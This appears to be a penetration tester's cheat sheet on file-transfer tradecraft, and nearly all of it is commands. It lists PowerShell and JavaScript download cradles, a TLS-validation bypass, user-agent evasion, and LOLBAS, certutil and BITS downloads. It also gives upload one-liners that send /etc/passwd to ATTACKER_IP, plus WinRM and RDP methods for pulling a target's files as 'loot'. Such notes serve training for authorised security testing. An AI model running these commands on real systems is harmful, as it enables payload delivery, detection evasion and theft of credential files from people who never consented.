# ADDENDUM 03: File Transfers — Advanced Techniques

## PowerShell System.Net.WebClient Full Methods
| Method | Description |
|--------|-------------|
| `OpenRead(url)` | Open stream to read from URL |
| `OpenReadAsync(url)` | Async version |
| `DownloadData(url)` | Download as byte array |
| `DownloadDataAsync(url)` | Async version |
| `DownloadFile(url, file)` | Download to file |
| `DownloadFileAsync(url, file)` | Async version |
| `DownloadString(url)` | Download as string |
| `DownloadStringAsync(url)` | Async version |

## PowerShell SSL/TLS Bypass
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## PowerShell -UseBasicParsing
```powershell
Invoke-WebRequest -Uri "http://IP/file.exe" -OutFile "file.exe" -UseBasicParsing
# Bypasses IE first-launch configuration requirement
```

## User Agent Detection & Evasion
| Tool | User Agent |
|------|-----------|
| PowerShell Invoke-WebRequest | `Mozilla/5.0 (Windows NT...WindowsPowerShell/5.1)` |
| WinHttpRequest | Similar to above |
| Msxml2 | `Mozilla/4.0 (compatible; MSIE...)` |
| Certutil | `Microsoft-CryptoAPI/10.0` |
| BITS | `Microsoft BITS/7.8` |

```powershell
# Change UA
$UA = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest -Uri "http://IP/file.exe" -OutFile "file.exe" -UserAgent $UA
```

## Harmj0y PowerShell Download Cradles
Reference: https://gist.github.com/HarmJ0y/bb48307ffa663256e239
- Proxy-aware cradles (inherit system proxy settings)
- No disk touch options
- Multiple transports: WebClient, WebRequest, WinHTTP, COM, BITS

```powershell
# Proxy-aware download
$WC = New-Object System.Net.WebClient
$WC.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$WC.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$WC.DownloadString("http://example.com/payload")
```

## FTP Non-Interactive (Command File)
```cmd
echo open 10.10.14.10 21> ftpcommand.txt
echo USER anonymous anonymous>> ftpcommand.txt
echo binary>> ftpcommand.txt
echo GET file.exe>> ftpcommand.txt
echo bye>> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

## WebDAV over HTTP/S
```bash
# Attacker: Setup
pip3 install wsgidav
wsgidav --host=0.0.0.0 --port=80 --root=/path/to/share --auth=anonymous

# Target: Mount
net use Z: http://ATTACKER_IP/
# DavWWWRoot = special Windows Shell keyword (no actual folder)
# SMB over HTTP fallback when port 445 blocked
```

## BITS (Background Intelligent Transfer Service)
```cmd
# CMD
bitsadmin /transfer mydownload http://ATTACKER_IP/file.exe C:\Users\Public\file.exe

# PowerShell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://ATTACKER_IP/file.exe" -Destination "C:\Users\Public\file.exe"
# "Intelligent" — adjusts bandwidth to minimize foreground impact
```

## Certutil (AMSI Warning)
```cmd
certutil.exe -verifyctl -split -f http://ATTACKER_IP/file.exe
certutil -urlcache -split -f http://ATTACKER_IP/file.exe
# WARNING: AMSI now detects certutil download as malicious
```

## LOLBAS Project
| Binary | Download | Upload |
|--------|----------|--------|
| CertReq.exe | `certreq -Post URL -config "outfile"` | `certreq -Post -config URL infile "dummy"` |
| GfxDownloadWrapper.exe | Version-specific Intel Graphics download utility | N/A |
Reference: https://lolbas-project.github.io/

## GTFOBins File Transfer
- Search syntax: `+file download` or `+file upload`
- Notable: OpenSSL for encrypted transfer, curl, wget, scp, rsync, nc, socat, base64, python, perl

## Bash /dev/tcp
```bash
# Bash 2.04+ built-in (requires --enable-net-redirections)
exec 3<>/dev/tcp/ATTACKER_IP/PORT
echo -e "GET /file HTTP/1.1\r\nHost: ATTACKER_IP\r\n\r\n" >&3
cat <&3
# No wget/curl needed!
```

## JavaScript/VBScript Download Cradles
```cmd
# wget.js
# var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
# WinHttpReq.Open("GET", WScript.Arguments(0), false);
# WinHttpReq.Send();
# var BinStream = new ActiveXObject("ADODB.Stream");
# BinStream.Type = 1; BinStream.Open();
# BinStream.Write(WinHttpReq.ResponseBody);
# BinStream.SaveToFile(WScript.Arguments(1));
cscript.exe /nologo wget.js http://ATTACKER_IP/file.exe output.exe

# wget.vbs — similar with Microsoft.XMLHTTP and Adodb.Stream
cscript.exe /nologo wget.vbs http://ATTACKER_IP/file.exe output.exe
```

## OpenSSL File Transfer ("nc style")
```bash
# Create cert
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 1 -out cert.pem

# Serve file
openssl s_server -quiet -accept 443 -cert cert.pem -key key.pem < file

# Receive file
openssl s_client -connect ATTACKER_IP:443 -quiet > file
```

## HTTPS Upload Server
```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes
python3 -m pip install uploadserver
python3 -m uploadserver --server-certificate cert.pem --server-certificate-key key.pem
curl -X POST https://ATTACKER_IP/upload -F 'files=@/etc/passwd' --insecure
```

## Nginx PUT Upload Server
```nginx
server { listen 9001; location / { root /tmp; dav_methods PUT; client_max_body_size 100m; } }
```
```bash
curl -T /etc/passwd http://ATTACKER_IP:9001/dir/file.txt
```

## PowerShell Remoting (WinRM) File Transfer
```powershell
$session = New-PSSession -ComputerName TARGET -Credential $cred
Copy-Item -ToSession $session -Path "./file.exe" -Destination "C:\Users\Public\file.exe"
Copy-Item -FromSession $session -Path "C:\Target\secret.txt" -Destination "./secret.txt"
# Useful when HTTP/HTTPS/SMB are all blocked
```

## RDP Drive Mounting from Linux
```bash
xfreerdp /v:TARGET /u:USER /p:PASS /drive:loot,/home/attacker/lab
# Access on target: \\tsclient\loot
# NOTE: Mounted drives NOT accessible to other users even if they hijack RDP session
```

## SMB Guest Access Blocking (Modern Windows)
```bash
# New Windows blocks unauthenticated guest access
# Workaround:
impacket-smbserver share /path/to/share -username user -password pass
# Target:
net use Z: \\ATTACKER_IP\share /user:user pass
```

## File Integrity Verification
```bash
# Linux
md5sum file.exe
# Windows
certutil -hashfile file.exe MD5
Get-FileHash -Algorithm md5 file.exe
# Cross-platform: hash before → hash after → compare
```

## File Encryption
```bash
# Linux
openssl enc -aes256 -iter 100000 -pbkdf2 -in file -out file.enc
openssl enc -aes256 -d -iter 100000 -pbkdf2 -in file.enc -out file

# Windows
# Invoke-AESEncryption.ps1 — AES-256 with key-based protection
```

## Data Exfiltration Guidance
> **WARNING:** Do NOT exfiltrate PII, financial data, trade secrets. Create dummy data mimicking client's protected data for DLP testing only.

## Temporary SSH Accounts
```bash
useradd -m -s /bin/bash tempuser && echo "tempuser:temppass" | chpasswd
# After engagement:
userdel -r tempuser
```

## Python/PHP/Ruby Mini Web Servers
```bash
python3 -m http.server          # Port 8000
python2.7 -m SimpleHTTPServer   # Port 8000
php -S 0.0.0.0:8000            # PHP 5.4+
ruby -run -ehttpd . -p8000     # Ruby
```

## Python3 Requests Upload One-Liner
```python
python3 -c 'import requests;requests.post("http://IP/upload",files={"files":open("/etc/passwd","rb")})'
```

## File Transfer Method Comparison
| Method | Auth | Binary Safe | Stealth | Target OS |
|--------|------|-------------|---------|-----------|
| HTTP GET | No | Yes | Low | All |
| HTTPS | No | Yes | Medium | All |
| SMB | Optional | Yes | Medium | Windows |
| FTP | Optional | Yes (binary) | Low | All |
| TFTP | No | Yes | Low | All |
| SCP | Yes | Yes | High | Linux |
| WinRM | Yes | Yes | High | Windows |
| RDP Drive | Yes | Yes | High | Windows |
| WebDAV | Optional | Yes | Medium | Windows |
| BITS | No | Yes | Medium | Windows |
| /dev/tcp | No | Yes | Low | Linux |
